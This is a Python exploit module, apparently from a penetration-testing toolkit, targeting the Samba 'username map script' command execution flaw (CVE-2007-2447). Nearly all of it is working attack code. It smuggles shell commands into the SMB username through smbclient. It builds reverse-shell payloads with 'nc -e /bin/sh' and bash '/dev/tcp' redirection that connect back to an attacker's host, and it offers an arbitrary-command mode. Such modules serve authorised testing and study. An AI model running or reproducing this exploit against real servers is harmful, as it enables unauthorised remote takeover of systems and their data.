"""
Samba 3.0.20 < 3.0.25rc3 - 'username map script' Command Execution
CVE-2007-2447

This module exploits a command execution vulnerability in Samba versions 3.0.20 through 3.0.25rc3
when using the non-default "username map script" configuration option. By specifying a username
containing shell meta characters, attackers can execute arbitrary commands.
"""

import socket
import time
from core.module_base import ModuleBase, ModuleType, Platform


class SambaUsermapScript(ModuleBase):
    """
    Samba 'username map script' Command Execution Exploit

    This exploit targets Samba 3.0.20-3.0.25rc3 with the 'username map script' enabled.
    It injects shell commands via the username parameter in SMB authentication.
    """

    def __init__(self):
        super().__init__()

        # Module Metadata
        self.name = "samba_usermap_script"
        self.description = "Samba 3.0.20-3.0.25rc3 'username map script' Command Execution"
        self.author = "UwU Toolkit (adapted from public exploits)"
        self.version = "1.0.0"

        self.module_type = ModuleType.EXPLOIT
        self.platform = Platform.LINUX

        self.tags = ["samba", "rce", "smb", "command-injection"]

        self.references = [
            "CVE-2007-2447",
            "https://www.exploit-db.com/exploits/16320",
            "https://www.samba.org/samba/security/CVE-2007-2447.html"
        ]

        # Module Options
        self.register_option(
            "RHOSTS",
            "Target Samba server IP address",
            required=True
        )
        self.register_option(
            "RPORT",
            "Target Samba port (usually 139 or 445)",
            required=True,
            default=139
        )
        self.register_option(
            "LHOST",
            "Local IP for reverse shell connection",
            required=True
        )
        self.register_option(
            "LPORT",
            "Local port for reverse shell listener",
            required=True,
            default=4444
        )
        self.register_option(
            "PAYLOAD",
            "Payload type to use",
            default="reverse_shell",
            choices=["reverse_shell", "bind_shell", "command"]
        )
        self.register_option(
            "COMMAND",
            "Command to execute (only for 'command' payload)",
            default=""
        )
        self.register_option(
            "TIMEOUT",
            "Connection timeout in seconds",
            default=10
        )

    def check(self) -> bool:
        """
        Check if target is running vulnerable Samba version

        Returns:
            True if target appears vulnerable
        """
        target = self.get_option("RHOSTS")
        port = self.get_option("RPORT")

        self.print_status(f"Checking if {target}:{port} is vulnerable...")

        try:
            # Try to connect to SMB port
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((target, int(port)))
            sock.close()

            if result == 0:
                self.print_good(f"Port {port} is open on {target}")
                self.print_status("Note: This check only verifies port availability")
                self.print_status("Run the exploit to confirm vulnerability")
                return True
            else:
                self.print_error(f"Port {port} is closed on {target}")
                return False

        except Exception as e:
            self.print_error(f"Check failed: {e}")
            return False

    def _create_netcat_payload(self, lhost: str, lport: int) -> str:
        """
        Create a netcat reverse shell payload

        Args:
            lhost: Listener IP
            lport: Listener port

        Returns:
            Shell command for reverse shell
        """
        # Using /bin/sh -i for interactive shell
        payload = f"nc -e /bin/sh {lhost} {lport}"
        return payload

    def _create_bash_payload(self, lhost: str, lport: int) -> str:
        """
        Create a bash reverse shell payload (works without nc -e)

        Args:
            lhost: Listener IP
            lport: Listener port

        Returns:
            Shell command for reverse shell
        """
        payload = f"/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        return payload

    def run(self) -> bool:
        """
        Execute the Samba usermap script exploit

        Returns:
            True if exploit executed successfully
        """
        # Get options
        target = self.get_option("RHOSTS")
        rport = int(self.get_option("RPORT"))
        lhost = self.get_option("LHOST")
        lport = int(self.get_option("LPORT"))
        payload_type = self.get_option("PAYLOAD")
        custom_cmd = self.get_option("COMMAND")
        timeout = int(self.get_option("TIMEOUT"))

        self.print_status(f"Targeting: {target}:{rport}")
        self.print_status(f"Payload: {payload_type}")

        # Build payload
        if payload_type == "reverse_shell":
            self.print_status(f"Setting up reverse shell to {lhost}:{lport}")
            # Try bash first (more reliable), fallback to netcat
            shell_cmd = self._create_bash_payload(lhost, lport)
        elif payload_type == "command":
            if not custom_cmd:
                self.print_error("COMMAND option required for 'command' payload")
                return False
            shell_cmd = custom_cmd
        else:
            self.print_error(f"Unsupported payload type: {payload_type}")
            return False

        self.print_status(f"Payload command: {shell_cmd}")

        # Use smbclient to trigger the vulnerability
        # The username field is where we inject our command
        # Format: "/=`nohup COMMAND`"
        username = f"/=`nohup {shell_cmd}`"

        self.print_status("Preparing exploitation via smbclient...")

        if payload_type == "reverse_shell":
            self.print_warning(f"Start a listener on {lhost}:{lport} before continuing!")
            self.print_status("Example: nc -lvnp 4444")
            time.sleep(2)  # Give user time to see warning

        # Use smbclient with malicious username
        # The password can be anything
        cmd = [
            "smbclient",
            f"//{target}/tmp",  # Connect to a share (tmp is commonly available)
            "-U", username,
            "-N"  # No password
        ]

        self.print_status("Triggering exploit...")
        self.print_status(f"Command: smbclient //{target}/tmp -U '{username}' -N")

        try:
            # Run the exploit
            returncode, stdout, stderr = self.run_command(cmd, timeout=timeout)

            # The exploit triggers even if smbclient fails to authenticate
            self.print_status("Exploit trigger sent!")

            if payload_type == "reverse_shell":
                self.print_good("Reverse shell should be connecting now")
                self.print_status("Check your listener for incoming connection")
            else:
                self.print_good("Command executed on target")

            self.print_status("Note: SMB connection may fail but payload still executes")
            return True

        except Exception as e:
            self.print_error(f"Exploit failed: {e}")
            return False

    def cleanup(self) -> None:
        """Cleanup after exploit"""
        self.print_status("No cleanup required")
        pass
